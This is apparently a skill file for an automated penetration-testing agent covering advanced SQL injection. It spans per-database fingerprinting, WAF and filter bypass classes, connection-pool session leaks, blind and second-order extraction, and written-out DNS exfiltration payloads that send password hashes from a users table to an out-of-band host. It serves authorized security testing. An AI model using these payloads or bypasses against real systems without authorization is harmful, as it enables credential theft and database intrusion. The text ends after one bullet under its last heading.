---
name: sql-injection-advanced-deep
description: Advanced SQL injection depth — parser/engine/driver/WAF differentials, second-order and blind extraction methodology, filter-bypass classes across tokenizer/parser/encoding layers, per-DBMS RCE chains, and composite multi-primitive exploitation.
sibling: sql_injection
load_when: scan_mode == "deep"
---

# SQL Injection — Advanced Depth

This is the advanced+expert deep sibling to `sql_injection.md`. The base owns the family framing and standard-mode technique catalog; the novel+frontier sibling `sql_injection_novel_deep.md` owns the 2024–2026 published-CVE frontier and emerging-stack expressions. This file owns the operational depth in between — parser/engine/driver differentials, second-order and blind methodology, WAF bypass classes, per-DBMS RCE chains, and composite exploitation — routing by filename.

Load this file when the target is beyond a probe hit: the sink is confirmed, the DBMS is identified, and the goal is either extraction under adverse conditions (WAF, blind, no response reflection, second-order only) or a chain to durable impact.

## Parser and Engine Differentials

The observable behavior of a SQL sink is decided by three parsers on the request path: the WAF's SQL grammar, the driver's client-side pre-processor, and the database engine's own parser. Where any two disagree, the disagreement is either a bypass class or a false positive discipline problem. Fingerprint each layer before firing.

### MySQL / MariaDB / Vitess / Aurora dialect drift

MySQL 8 and MariaDB 10.6+ have diverged enough that a payload that fires on one silently fails on the other. Load-bearing differences you can fingerprint from the outside:

- **Windowing functions**: MySQL 8 supports `LAG()`, `LEAD()`, `NTILE()`. MariaDB implements the same syntax on 10.2+ but with subtle boundary differences (`ROWS BETWEEN UNBOUNDED PRECEDING` on an unindexed set is O(n²) on some MariaDB builds — a timing side channel that scales differently from MySQL).
- **CTEs**: MySQL 8 and MariaDB 10.2+ both support `WITH RECURSIVE`, but MariaDB permits `CONNECT BY` (Oracle-style) that MySQL rejects — a recursive-CTE payload that uses `CONNECT BY` fingerprints MariaDB immediately.
- **JSON operators**: MySQL 8 uses `->` and `->>`; MariaDB implements `JSON_VALUE`/`JSON_EXTRACT` but not `->>` until 10.5. On a mixed cluster, sending both operator forms and observing which one errors identifies the flavor.
- **`SQL_MODE`**: `ONLY_FULL_GROUP_BY`, `NO_BACKSLASH_ESCAPES`, and `ANSI_QUOTES` change what parses cleanly. `NO_BACKSLASH_ESCAPES` disables `\'` — payloads that quote via backslash escape break silently on `sql_mode=NO_BACKSLASH_ESCAPES` even on MySQL. Fingerprint by injecting `SELECT @@sql_mode` where possible.
- **Vitess / PlanetScale**: Vitess sits in front of shards and re-parses queries — it rejects features that don't shard cleanly. `LOAD DATA LOCAL INFILE`, `xp_*`-style extensions, and cross-shard `JOIN` on non-indexed columns are silently rewritten or rejected. Prepared statements are re-planned per shard; a payload that assumes a stateful cursor may fail. Vitess's SQL parser (Go) is a documented custom implementation — its grammar accepts a subset of MySQL; look for `unsupported construct` errors as the Vitess signature.
- **Aurora MySQL**: mostly parser-compatible with the corresponding MySQL 5.7/8 line but with `aurora_*` system variables (`aurora_version`, `innodb_read_only`) and specific replica routing side effects — writes on a reader endpoint fail with a distinct error class that fingerprints Aurora vs upstream MySQL.

### PostgreSQL / CockroachDB / YugabyteDB / Redshift / Aurora Postgres

Postgres's dialect is more portable than MySQL's, so more engines claim compatibility — but the incompatibilities are where the interesting behavior sits.

- **CockroachDB**: `pg_sleep()` exists but `SLEEP` extension variants don't; `information_schema` is fully populated but `pg_catalog` has CockroachDB-specific views (`crdb_internal.*`) that reveal cluster topology and node health — an SQLi that reaches these leaks internal infrastructure the DBA does not intend to expose. CockroachDB rejects `COPY ... TO PROGRAM` (no server-side filesystem), so the PostgreSQL RCE chain via `COPY TO PROGRAM` fails on Cockroach — do not report it as an SQLi-to-RCE finding without verifying the engine.
- **YugabyteDB**: PostgreSQL-wire-compatible; supports `pg_sleep`, `dblink`, the `http` extension when explicitly loaded. Yugabyte-specific catalog views under `pg_catalog` fingerprint the engine (`pg_yb_*`).
- **Redshift**: PostgreSQL-compatible surface but with Redshift-specific functions (`LISTAGG`, `APPROXIMATE COUNT DISTINCT`). No `pg_sleep`; `pg_terminate_backend` requires super privileges. `stl_*` and `svl_*` system views are Redshift-specific — leaking one confirms Redshift. `UNLOAD` to S3 is the Redshift analogue of `COPY TO PROGRAM` — an S3 write from a SQLi is a distinct impact.
- **Aurora Postgres**: mostly PostgreSQL-parser-compatible, but `aurora_stat_*` views and `aws_lambda` / `aws_s3` extensions can be loaded — a `aws_s3.query_export_to_s3` reachable from a SQLi writes to S3 under the DB's IAM role. This is a chain into `cloud/aws.md`.

### MSSQL

- **Compatibility level** (`sys.databases.compatibility_level`) changes parser strictness — 100 (SQL Server 2008) accepts `*=` legacy outer join syntax, 130+ rejects it. Fingerprint by injecting a legacy operator and checking the error class.
- **Row-level security** (introduced 2016) may hide rows from a SQLi query even when the injection succeeds — an unexpectedly-empty result under RLS is not confirmation-failure, it is authorization working. Read `sys.security_policies` if the injection reaches it.
- **Contained databases** vs classical logins change how `USER_NAME()` and `SUSER_SNAME()` resolve; a SQLi that fingerprints `is_contained` reveals the auth architecture.

### Oracle

- **PDB vs CDB** (multitenant): `V$CONTAINERS`, `CDB_*` views are pluggable-database-specific. An injection into a CDB context has broader reach than one confined to a PDB.
- **Oracle 23c JSON Relational Duality Views**: a new surface where a "table" is actually a JSON-projection view; SQL against it may hit unexpected constraints. Fingerprint via `USER_JSON_RELATIONAL_DUALITY_VIEWS`.
- **`DBMS_ASSERT`** is Oracle's canonical identifier-allowlisting API; code that uses `DBMS_ASSERT.SIMPLE_SQL_NAME` before interpolation closes the identifier-position class. Its *absence* on a dynamic-SQL code path is the smell.

### Analytics / lakehouse engines

- **Trino / Presto**: SQL-shape, but no direct filesystem write; secondary storage writes go through connector-specific commands (`CREATE TABLE ... WITH (external_location = 's3://...')`). Injection can write to any bucket the connector's IAM role can reach. `system.runtime.nodes`, `system.metadata.catalogs` leak cluster shape.
- **Snowflake**: `PUT`/`GET` file staging is a direct file transport; SQLi that reaches `PUT` writes to Snowflake stages. `INFORMATION_SCHEMA.QUERY_HISTORY` reveals other users' recent SQL — a horizontal leak in a multi-tenant Snowflake account.
- **BigQuery**: standard SQL, but `EXPORT DATA OPTIONS(uri = 'gs://...')` writes to GCS; a SQLi that reaches `EXPORT DATA` writes under the query's IAM identity.
- **Databricks SQL**: parses via Spark SQL grammar; `COPY INTO` and `DBUTILS.FS.PUT` reachable from a notebook context are RCE-adjacent primitives.

### Confirmation via error-string family

Engine-specific error strings survive most middleware transformations:

| Fragment | Engine |
|---|---|
| `You have an error in your SQL syntax; check the manual` | MySQL/MariaDB |
| `Unknown system variable 'aurora_version'` | not-Aurora (probing Aurora) |
| `unsupported construct: ` | Vitess |
| `syntax error at or near ` | PostgreSQL family |
| `pq: relation ... does not exist` | Postgres via lib/pq Go driver |
| `psycopg2.errors.SyntaxError` | Postgres via psycopg2 |
| `crdb_internal.cluster_id` | CockroachDB (confirmed on error path) |
| `stl_query` / `svl_query_summary` | Redshift |
| `Unclosed quotation mark after the character string` | MSSQL |
| `SQL Server does not exist or access denied` | MSSQL client |
| `ORA-00933: SQL command not properly ended` | Oracle |
| `unrecognized token: ` | SQLite |
| `error in your SQL syntax near '`` (backtick) | ClickHouse |
| `Query failed (#20000004): SYNTAX_ERROR` | Trino/Presto |

An error message is not proof of exploitability, but it locks the engine. Once locked, the technique catalog narrows to that engine's dialect.

## Type Coercion and Alignment Depth

`UNION SELECT` and error-based extraction both require the injected expression to align with the outer query's column types. What "align" means differs per engine and is where a payload silently drops rows.

### MySQL / MariaDB

- Implicit numeric-to-string coercion is aggressive: `SELECT 1 UNION SELECT 'a'` returns two rows because MySQL widens `INT` and `VARCHAR` to a common `VARCHAR`. Aurora and PlanetScale/Vitess inherit this.
- `NULL` aligns with everything — a `UNION SELECT NULL, NULL, NULL, ...` walk finds the column count without hitting type mismatches.
- Binary vs text columns: `SELECT 1 UNION SELECT LOAD_FILE('/etc/passwd')` may return NULL when the outer's charset doesn't accept the file's bytes. Cast to `CONVERT(... USING utf8mb4)` or hex-encode (`HEX(LOAD_FILE(...))`) to normalize.
- `TIMESTAMP` narrowing: aligning a `TIMESTAMP` column with a computed value may hit MySQL's `'0000-00-00 00:00:00'` zero-date rejection under `NO_ZERO_DATE` sql_mode. Coerce to `VARCHAR` via `CAST(... AS CHAR)`.
- Enum coercion: an `ENUM('a','b')` column receives numeric indices for out-of-set values; injecting an `INT` may land as an index cast rather than an error.

### PostgreSQL

- Type inference is stricter than MySQL. `SELECT 1 UNION SELECT 'a'` errors with `UNION types integer and text cannot be matched`.
- Explicit casts survive: `SELECT 1 UNION SELECT 'a'::int` errors (invalid integer), but `SELECT 1::text UNION SELECT 'a'` succeeds. Cast the leading query's columns to `text` uniformly with a `SELECT CAST(col AS text) FROM ...` shape.
- `NULL` alignment works cross-type, same as MySQL.
- `bytea` columns need `encode(col, 'hex')` or `encode(col, 'base64')` to render.
- `json`/`jsonb` alignment: PostgreSQL treats these as distinct types; `SELECT '{}'::json UNION SELECT '{}'::jsonb` errors. Cast to `text` for portability.
- `citext` (case-insensitive text) exists on installs with the extension loaded — a `WHERE username = 'admin'` may match multiple case-variants, changing extraction cardinality unexpectedly.

### MSSQL

- Coercion follows the "data type precedence" ordering: `nvarchar` > `varchar` > `int` > ... A `UNION SELECT 1, 'a'` succeeds because the second query's `'a'` is `varchar` and the first's `1` is `int` — MSSQL widens to `varchar`.
- `sql_variant` is a wildcard type: `SELECT CAST(1 AS sql_variant)` aligns with anything.
- `NTEXT`/`TEXT` (deprecated) reject `UNION` alignment on many builds; convert to `NVARCHAR(MAX)`.

### Oracle

- Coercion is documented in the SQL Language Reference "Type Priority" table. `NUMBER` and `VARCHAR2` are not implicitly interchangeable in `UNION` — cast explicitly with `TO_CHAR(...)`.
- `NULL` alignment works cross-type as elsewhere.
- `RAW`/`BLOB` columns need `UTL_RAW.CAST_TO_VARCHAR2(...)` or `DBMS_LOB.SUBSTR(...)` conversion.
- `CLOB` return values are size-limited in some drivers (32 KB default); large extractions may silently truncate.

### Type-confusion side channels

Even without a visible UNION, type mismatches produce observable errors:
- `SELECT ... WHERE id = 'abc'` on an `INT` column errors "invalid input syntax" on Postgres, "Truncated incorrect INTEGER value" on MySQL — different engines' error shape for the same shape of mistake fingerprints the engine.
- `SELECT CAST(current_setting('server_version') AS int)` errors with the version string in the error message — an extraction primitive that requires no UNION.
- `SELECT CAST((SELECT top 1 password FROM users) AS int)` on MSSQL errors with the password value in the message, on affected builds.

## Character Set and Collation Depth

Charset and collation control how strings compare, sort, and convert — and they are the substrate several bypass classes ride on.

### MySQL / MariaDB collation

- `utf8mb4_unicode_ci` (case-insensitive, Unicode-aware): `WHERE username = 'admin'` matches `'ADMIN'`, `'Admin'`, and (on some collation versions) fullwidth `'ａｄｍｉｎ'`. An authentication query on `_ci` collation is trivially case-bypassable.
- `utf8mb4_bin` (case-sensitive, byte-comparison): case matters, but Unicode normalization does not — a normalized `admin` and a compatibility-decomposed `admin` may compare unequal.
- `_general_ci` vs `_unicode_ci`: `_general_ci` uses a simplified sort order that may treat distinct characters as equal (`ß` = `ss`). A password stored as `passwd` may match a login as `paßwd` under `_general_ci`.
- `SET NAMES` on connection: the app declares its charset at connect; a mismatch between what the app sends and what the server stored produces silent double-encoding. Combined with `NO_BACKSLASH_ESCAPES` (see Parser Differentials), this bypasses `addslashes`-style escaping.

### PostgreSQL collation

- ICU vs libc collations: PG 10+ supports ICU collations; behavior on `LIKE` and `<` with an ICU collation may differ from libc across kernel/glibc upgrades. A `ORDER BY` payload's observable order shifts across cluster hosts.
- `C` collation is byte-identical; `en_US.UTF-8` is locale-aware. `LIKE 'a%'` matches differently under each.

### MSSQL collation

- Server, database, and column collations can all differ. `COLLATE DATABASE_DEFAULT` on the injected side may not match the target column's collation, producing "cannot resolve collation conflict" errors — that error is a fingerprint of a collation-differential; use `COLLATE SQL_Latin1_General_CP1_CI_AS` explicitly.
- Case-insensitive collations (`_CI`) make authentication case-bypassable.

### Charset-differential bypass

Between the WAF and the DB:
- WAF inspects bytes as ASCII; DB decodes as UTF-8. A payload using a UTF-8 multi-byte sequence for `'` (`0xC0 0xA7` overlong, if the DB accepts) reaches the DB as an apostrophe. Modern MySQL rejects overlong; some older MariaDB builds accept.
- WAF inspects bytes as UTF-8; DB decodes as latin1. Mixed-encoding attacks: sending `%FF%2527` — the `%FF` is not a valid UTF-8 start byte, so a strict UTF-8-only WAF may error or pass-through; the DB decoding as latin1 sees `ÿ%27` (still a quote at the second position).
- Fullwidth apostrophe (`U+FF07` → `%EF%BC%87` in UTF-8) survives WAFs that inspect ASCII quotes but reaches DB collations that Unicode-normalize on comparison.

## Query Smuggling and Connection-Layer Attacks

Distinct from HTTP request smuggling — the DB analogue is two parsers (a proxy and a backend) interpreting the same wire protocol differently.

### PgBouncer / connection poolers

- **Transaction pooling mode**: PgBouncer holds one server connection open for many client connections, switching per transaction. Prepared statements cached server-side leak across clients — a SQLi that creates a prepared statement in one session may serve subsequent sessions the same plan. `SET` statements likewise leak.
- **`SET SESSION AUTHORIZATION`** — an injection that runs `SET SESSION AUTHORIZATION 'admin'` in transaction-pooling mode may leave the next client's session as `admin`. Modern PgBouncer strips some of these; audit the `ignore_startup_parameters` list.
- **`PREPARE` / `EXECUTE`** — leftover prepared statements in a pooled connection can be executed by an unrelated client via `EXECUTE <name>` if the name is predictable.

### PROXY protocol and connection identity

- When PgBouncer/HAProxy forwards via PROXY protocol, the DB sees the connection source as the proxy, not the client. Access controls that rely on `pg_hba.conf`'s `hostssl ... 10.0.0.0/8 md5` may unexpectedly trust a proxy-forwarded connection.
- A SQLi that reaches `SELECT current_setting('application_name')` reveals the app's identity string — often a debug leak worth logging.

### Cross-database smuggling via `dblink` / linked servers

- MSSQL linked servers execute queries on remote instances under a mapped credential. `EXEC ('SELECT ...') AT LinkedServer` runs on the remote — the injection reach extends transitively across linked servers.
- PostgreSQL `dblink('dbname=x host=y user=z', 'SELECT ...')` similarly reaches other clusters. `dblink_connect_u` uses trust auth for local connections — a superuser SQLi reaching `dblink_connect_u('host=127.0.0.1 user=postgres', ...)` bypasses password auth on the loopback listener.

### Cursor and transaction state leaks

- Long-running transactions hold locks, block VACUUM, and pollute snapshot isolation views. A SQLi that starts a transaction and does not close it can cause target-wide performance degradation — a DoS-adjacent side effect worth being deliberate about.
- Cursor state on some drivers persists across statements on the same connection; an injection that opens a cursor may leave it fetchable on the next request in the same pool.

## Blind Extraction — Advanced Channels

Boolean and time-based are the base file's coverage. Advanced targets add three axes: statistical treatment of noisy channels, alternative oracles beyond the response body, and side channels through infrastructure the app does not consider part of the response.

### Statistical time-based methodology

Naive time-based fails on jittery targets. The reliable protocol:

1. **Control baseline**: 10 samples of the same request without the injection, or with `SLEEP(0)`. Compute median and MAD (median absolute deviation). This is the noise floor.
2. **Probe with scaling**: run the same predicate with `SLEEP(1)`, `SLEEP(3)`, `SLEEP(5)`. The observed delay must scale linearly with N; a target that shows `SLEEP(1)`≈`SLEEP(5)` is either not injectable or the sink is buffered/batched somewhere downstream.
3. **Per-bit sample count**: 5–7 samples per bit, median rules. Discard the max and min; the remaining triple gives the answer under 95% confidence for a typical noise profile.
4. **Adaptive N**: start with `SLEEP(N)` where N > 3× median control latency. If confidence is low after 5 samples, double N; if the target rate-limits at scale, halve N and increase sample count.
5. **Parallelism budget**: 2–4 in-flight requests per victim IP; more triggers rate limiters or connection-pool exhaustion that adds jitter to the very measurement you are trying to make.

For very noisy channels (CDN in front, autoscaling backend), use `BENCHMARK`-style CPU burn instead of `SLEEP` — `BENCHMARK(N, MD5(RAND()))` scales with request volume in a way that co-varies with request pipelining, which is often quieter than absolute sleep.

### EXPLAIN as oracle

`EXPLAIN <query>` returns the query plan without executing it. On many engines, `EXPLAIN` cost/rows change with predicate truth even when the query itself returns no rows — a differential oracle that leaves no trace in slow-query logs.

- **PostgreSQL**: `EXPLAIN (COSTS true) SELECT ... WHERE <predicate>` — cost is deterministic per plan; a predicate that changes plan changes cost.
- **MySQL 8**: `EXPLAIN FORMAT=JSON` returns row estimates; `EXPLAIN ANALYZE` (MySQL 8.0.18+) executes and reports actual times — that is a channel on its own.
- **MSSQL**: `SET SHOWPLAN_XML ON; SELECT ...` returns plan XML; row estimates leak predicate cardinality.
- **Oracle**: `EXPLAIN PLAN FOR SELECT ...; SELECT * FROM TABLE(DBMS_XPLAN.DISPLAY);` — plan bytes and cost differ per row-estimate.

The oracle: submit the injection wrapped in `EXPLAIN`, extract the cost or row estimate from the response. Blind extraction becomes a numeric-comparison problem, not a boolean one — a bit-level channel with per-request certainty.

### Cache and CDN differential side channels

- **Response caching**: a payload that changes the response body causes a cache miss on subsequent requests; a payload that does not (blind) causes a cache HIT. `Age`, `X-Cache: MISS`, and `CF-Cache-Status: HIT` are per-request oracles. A predicate that is *true* triggers a body change → MISS → longer time; false → HIT → shorter. This works even against a target with strict WAF blocking on the response body.
- **Cache-poisoning oracle**: force the target to cache a variant, then read the variant back from a different request that shares the cache key — the second request confirms the first's execution without touching the vulnerable endpoint again.
- **CDN log side channels**: some CDNs expose per-tenant log dashboards; a SQLi that reaches an outbound HTTP fetch (via `http` extension, `dblink`, `UTL_HTTP`) landing on a URL you control appears in the CDN's own logs before the app sees it. When the app filters response bodies aggressively, the CDN log entry is the oracle.

### Out-of-band bit exfiltration via DNS

The base file covers OAST for confirmation. For extraction, encode data into subdomain labels:

- MySQL: `LOAD_FILE(CONCAT('\\\\', (SELECT HEX(password) FROM users LIMIT 1), '.oast.fun\\a'))`
- PostgreSQL with `http` extension: `SELECT http_get('http://' || (SELECT encode(password_hash::bytea, 'hex') FROM users LIMIT 1) || '.oast.fun')`
- Oracle: `UTL_HTTP.REQUEST('http://' || (SELECT DUMP(password, 16, 1, 20) FROM users WHERE ROWNUM = 1) || '.oast.fun/')`
- MSSQL: `EXEC master..xp_dirtree '\\' + (SELECT TOP 1 CONVERT(varchar, HASHBYTES('SHA1', password), 2) FROM users) + '.oast.fun\a'`

Chunk to fit DNS label limits (63 bytes per label, 253 bytes per name). Base32 or hex-encode to survive the DNS charset. Correlate the arriving subdomain to the injected query by unique per-request prefixes (`SELECT ... || 'req-' || <nonce>` in the encoded payload) — a batch of exfil requests interleaves at the OAST endpoint, and the nonce prefix reconstructs order.

### HTTP/2 multiplexing and connection-pool side channels

- **HTTP/2 multiplexing**: parallel streams on one connection amortize connection setup. For blind extraction, this permits N-way parallel bit tests against a target that would rate-limit N-way HTTP/1.1 connections. The measurement caveat: HEAD-of-line blocking on the multiplexed connection introduces its own timing artifact — an early slow response delays the entire connection's read side. Confirm the target speaks HTTP/2 (`ALPN`, `:protocol` pseudoheader) before assuming the parallelism is real.
- **Connection-pool exhaustion**: on some app-pool setups, holding a connection open with a slow SQLi (a slow subselect deliberately introduced) starves other clients. The finding is not the SQLi's data — it's the DoS-adjacent behavior of the app under partial pool starvation. Document with restraint; do not use as a routine measurement channel on production.
- **TLS handshake latency**: outbound DB-side HTTPS requests (via `http` extension, `sp_OACreate` with `MSXML2.ServerXMLHTTP`) include a TLS handshake per request; the handshake time varies by target host — a differential oracle that reveals which internal HTTPS hosts are reachable without needing a response body.

### Second-order and stored-blind chains

Second-order + blind: the payload stores at endpoint A, fires at endpoint B (an admin dashboard, a reporting job, a background worker). Confirmation requires either:
- an OAST callback wired into the stored payload itself (the DB-side outbound function fires when B reads the row), or
- a state change B produces that A can observe (a row's `viewed_at` timestamp, a computed cache invalidation, a webhook triggered by B's read).

The base file names the two-stage hunt; the advanced discipline is establishing the temporal correlation reliably — polling B on a known cadence, injecting at A with a unique nonce, watching for the OAST or state signal within B's polling window plus the DB round-trip. Timestamp-based correlation requires clock discipline: the tester's clock, the OAST clock, and the target's clock all drift.

## Second-Order Injection Deep

The base file describes the two-stage hunt. Advanced methodology:

### Payload tagging with nonce triples

Every input carries a triple: `<class-tag>-<field-tag>-<nonce>`. Example: `t2SQLi-displayName-8a3f9c`. On a hit, the second endpoint's response, log, or database error identifies:
- **which class** of payload landed (SQLi, XSS, XXE, XSSI cross-cover) — the class-tag disambiguates when the same input surface is fuzzed with multiple classes
- **which field** the tester stored it in — needed when 20+ fields are seeded in one round
- **which specific injection attempt** — the nonce disambiguates when the same field is retried

Store a spreadsheet: `<nonce> → <endpoint POST'd to> → <timestamp> → <original payload>`. When an OAST callback or a delayed error surfaces with a nonce, you have the full injection provenance.

### Differential storage tables

When the app writes to multiple tables from one input (user profile writes to `users`, `audit_log`, and a `search_index`), each write may be parameterized differently. Inject the same payload; grep every table for it via a supplementary SQLi at the read side. If the payload appears in the search-index table without escaping while `users` shows it escaped, the second-order sink is the search index.

### Temporal correlation for background-job second-order

Many second-order sinks live inside background jobs — a daily digest email, a nightly report, a Sidekiq/Celery worker consuming a queue. The correlation window is job-cadence:
- **Once-daily**: inject before scheduled window, wait, observe next-day report or OAST hit
- **Queue-consumer**: measure typical time-to-consume by seeding a benign nonce and watching the job's telemetry (if any); align payloads to the observed lag
- **Retry-driven**: some workers retry failed jobs; a payload that crashes the job on the first attempt may fire correctly on retry with different context (worker retried in a different sandbox, environment, credential)

### Log-fed second-order

`User-Agent`, `X-Forwarded-For`, `Referer`, uploaded filenames all often land in a log viewer that queries a log DB. A SQLi payload in `User-Agent` might reach a Kibana → Elasticsearch → embedded SQL bridge, or a SIEM's back-end SQL search. Confirmation is an oracle at the log-viewer endpoint, not the primary app. The advantage: the log viewer is often internal-only, weakly monitored, and the injected user is anonymous (the User-Agent field is not tied to a session).

### Framework-worker second-order sinks

Each async framework has a canonical write-to-storage → worker-reads shape:

- **Celery** (Python): tasks pickle-serialize args by default to Redis/RabbitMQ; a stored payload in a task arg lands in the worker's context. The worker may execute a DB query with the arg interpolated — the sink lives in the worker's code path, not the enqueuer's. Grep worker modules for `.raw()`, `.extra()`, `text()` on task-arg-derived strings.
- **Sidekiq** (Ruby): args stored JSON in Redis; workers deserialize and execute. ActiveRecord `.where("... #{arg}")` in a worker is the sink.
- **Bull / BullMQ** (Node): jobs JSON-stored in Redis; workers pull and execute. Sequelize/Prisma raw-query calls in worker handlers.
- **RQ** (Python): pickle-serialized to Redis; same class as Celery.
- **Delayed Job / Que** (Ruby, Postgres-backed): jobs stored as YAML/JSON in a `delayed_jobs` table. The worker DB reads self-referentially — a SQLi that reaches the `delayed_jobs` table can inject into the job payload, which fires as ActiveRecord in the worker.
- **Temporal / Cadence**: activities run under a workflow engine; args serialized to workflow history. The worker's activity code is the sink.
- **AWS Lambda + SQS**: message-body-derived args reach the Lambda handler; if the handler does raw SQL, the SQS message is the injection vector.
- **Cron-shape workers** (`cron`/`Anacron`, Kubernetes CronJob): time-triggered SQL against config tables; the injection lives in whatever seeded the config row.

Correlation methodology: OAST-embed the injection with a nonce and a shape-tag identifying the enqueuer, then poll OAST for the fire; the arrival time minus the enqueue time approximates the worker cadence.

## WAF and Filter Bypass Classes

Base file coverage: whitespace/keyword-splitting/encoding at the token layer. Advanced bypasses operate at the parser and encoding-boundary layers, and target the disagreement between the WAF's SQL grammar and the database's.

### Encoding-boundary bypasses

A WAF operating on decoded input inspects one representation; the DB sees another. Where the two decoders differ:

- **Double URL encoding**: `%2527` decodes once to `%27`, twice to `'`. If the WAF decodes once and the app+DB path decodes twice, the WAF sees a literal `%27` (not a quote), the DB sees `'`.
- **Charset differential** — `charset=utf-16le` in a multipart part or `Content-Type` header. The WAF inspects raw bytes and sees garbage; the app decodes to a legitimate string. See the canonical Busboy multipart parser-differential block in `ssrf_advanced_deep.md` § Busboy Multipart Parser-Differential — Canonical Block for the four variant families reusable across `sqli`/`rce`/`ssrf`/`xss`.
- **Unicode normalization**: a fullwidth apostrophe (`U+FF07`) or `MODIFIER LETTER APOSTROPHE` (`U+02BC`) may normalize to `'` at the app but not at the WAF. Test the whole `'`/`"`/`(`/`)`/`;`/`--` set in fullwidth and modifier forms.
- **UTF-8 overlong sequences**: modern parsers reject these, but a legacy WAF that accepts an overlong `'` (`0xC0 0xA7`) while the DB rejects (or normalizes) it leaks a bypass. Confirm against the DB, not the WAF.
- **Base64 in the payload**: the WAF inspects HTML/JSON-shape strings; if the app decodes a `base64:` prefix or a base64-encoded query parameter before it reaches SQL, the WAF is blind. Grep the app for `base64.b64decode`/`Buffer.from(..., 'base64')` in a request-handling path.

### Tokenizer-differential bypasses

WAFs implement their own SQL tokenizers (regex-based, ANTLR-based, or hand-rolled). Every difference from the DB's tokenizer is a bypass.

- **Comment forms**: `--` line comment, `/* */` block comment, `#` MySQL-only, `-- ` (requires trailing whitespace for classic MSSQL parsers). A WAF that skips block comments may miss `/*!50000UNION*/` (MySQL versioned execute-if-supported) — the DB reads UNION, the WAF sees a comment.
- **Whitespace equivalents**: `\t` `\n` `\r` `\v` `\f`, `%A0` (non-breaking space on some engines), `+` (in URL encoding), `%20`, `%09`. Between-token whitespace forms in the DB parser include some that a regex WAF misses.
- **Case folding differences**: some WAF regexes are case-sensitive by mistake; `SeLeCt` bypasses `\bSELECT\b` on those.
- **Alternative delimiters**: MySQL/MariaDB accept backticks around identifiers, PostgreSQL accepts double-quotes, MSSQL accepts `[brackets]`. A WAF regex that matches `SELECT * FROM users` may miss `SELECT * FROM \`users\`` if it required whitespace around the table name.

### Parser-differential (SQL grammar) bypasses

The WAF's tokenizer is one layer; the WAF's *grammar* is another. Where the WAF grammar rejects a construct the DB accepts (or vice versa), the disagreement is exploitable:

- **`UNION` in a subselect**: `SELECT (SELECT 1 UNION SELECT 2)` — many WAFs match `UNION SELECT` as top-level but miss it nested.
- **CTE relocation**: `WITH t AS (SELECT ...) SELECT * FROM t` where the payload lives in the CTE, not the outer SELECT.
- **Lateral joins** (Postgres/MySQL 8): `SELECT * FROM t, LATERAL (SELECT ...) x` — WAF may not track lateral scoping.
- **Case expressions**: `CASE WHEN (SELECT 1 FROM users WHERE ...) THEN 1 ELSE 0 END` — the WAF sees a `CASE`, not a subquery.
- **JSON-path evaluations**: `SELECT '{"a":1}'::jsonb @> (SELECT current_setting('...'))::jsonb` — the JSON operator's right-hand side is a subquery the WAF may not recurse into.
- **Window function argument**: `SELECT ROW_NUMBER() OVER (ORDER BY (SELECT ...))` — the OVER clause's ORDER BY is a subquery position.

### Framework-layer parser bypasses

WAFs sit in front of a framework; the framework re-parses the request. Where the framework's parser differs from the WAF's, the framework's parse-result is what reaches the SQL sink.

- **Multipart parser differentials**: see the canonical Busboy multipart parser-differential block in `ssrf_advanced_deep.md` § Busboy Multipart Parser-Differential — Canonical Block — four techniques (duplicate boundary, non-UTF-8 header fail-open, part-level `charset=utf16le`, dual `Content-Type` charsets) that bypass a WAF fronting a Busboy-based Node app.
- **JSON parser depth**: WAF rejects nested JSON past N levels; app accepts to `N+K`. Payload sits at level `N+K+1`.
- **URL-decoding depth**: WAF decodes once; app+router decode twice. Payload uses `%2527`.
- **Query-string array notation**: PHP's `?x[]=1&x[]=2` becomes an array; Rails's `?x[foo]=1` becomes a hash; a WAF matching a flat query string may miss the array form entirely.
- **GraphQL variables**: WAF inspects only the `query` string, ignores the `variables` map. Payload lives in `variables`.

### Cloud WAF-provider technique posture

Every major cloud WAF has a documented technique surface. The advanced-tier posture is to fingerprint which one is in front of the target before crafting the payload.

- **Cloudflare**: `Server: cloudflare`, `CF-Ray`, `CF-Cache-Status` headers; the managed SQLi rules (Cloudflare Ruleset Engine) are updated frequently. Bypass discipline is one-axis-at-a-time (encoding, then whitespace, then keyword-splitting). Cloudflare exposes a "sensitivity" knob per rule that tenants tune; a low-sensitivity SQL rule tolerates payloads that a high-sensitivity one blocks.
- **AWS WAF**: `X-Amzn-Trace-Id` header on origin; managed `AWSManagedRulesSQLiRuleSet` is the shape. AWS WAF's body inspection is capped at 8 KB by default — payloads past the cap are not inspected. Chunked-encoding requests and large multipart bodies can push the interesting content past 8 KB.
- **Akamai / Kona Site Defender**: signature-based; `Server: AkamaiGHost` / `X-Akamai-*` headers. Historically Akamai has been strong on SQLi signatures and weak on tokenizer differentials — a versioned MySQL comment or a `/*!50000...*/` block often survives.
- **Fastly / Signal Sciences**: JS-runtime rules at the edge. `Server: Fastly`, `X-Served-By`, `Fastly-Debug-Path` (when enabled). Some SigSci rules inspect only URL-decoded input; nested encoding can bypass.
- **Imperva / Incapsula**: `X-Iinfo`, `visid_incap_*` cookies. Historically layered — a WAF pattern plus a bot-detection layer plus a rate limiter — meaning "block" can mean any of them, and diagnosing which layer fired is part of the bypass work.
- **Vercel WAF**: `X-Vercel-Id` header; fronts a Node/undici pipeline. Multipart parser-differential class discussed above applies here — canonical block lives at `ssrf_advanced_deep.md` § Busboy Multipart Parser-Differential — Canonical Block.

Note the advanced-tier discipline: iterate one axis at a time (encoding OR whitespace OR keyword-splitting OR nesting), and confirm each iteration against the *real* target-side parse, not against a WAF-response signature. A 200 response is not confirmation the payload landed; it may be that the WAF let it through and the app rejected it. Only oracle-verifiable execution is confirmation.

### Rule-shape discovery

Before bypassing, know what you are bypassing. Structured discovery:
1. **Bisect the payload**: send a minimal SQLi (`'`) and a full one (`' UNION SELECT NULL--`); the WAF blocks the second, permits the first. Bisect the character range that triggers the block.
2. **Character-class probe**: send single characters or short strings from each SQL character class (whitespace, punctuation, keywords, comments). Note which trigger. This maps the WAF's coarse rule shape.
3. **Regex-pattern probe**: for a suspected regex-based WAF, send `SELECT`, `SEL/**/ECT`, `SEL\nECT`, `%53ELECT`, `SELECT`. Which variant passes reveals the regex flags (case-sensitivity, `.` matches newline, decoding depth).
4. **Response-timing probe**: some WAFs run the SQL rule in a separate process; the observable per-request WAF-added latency reveals which rules ran without needing a block-response to disambiguate.

### Cross-encoding smuggling

Layer encodings so that the WAF's decoder path differs from the app's:
- **URL + base64**: WAF URL-decodes to a base64 string; app additionally base64-decodes to the injection. If the WAF has no base64 rule, the payload passes.
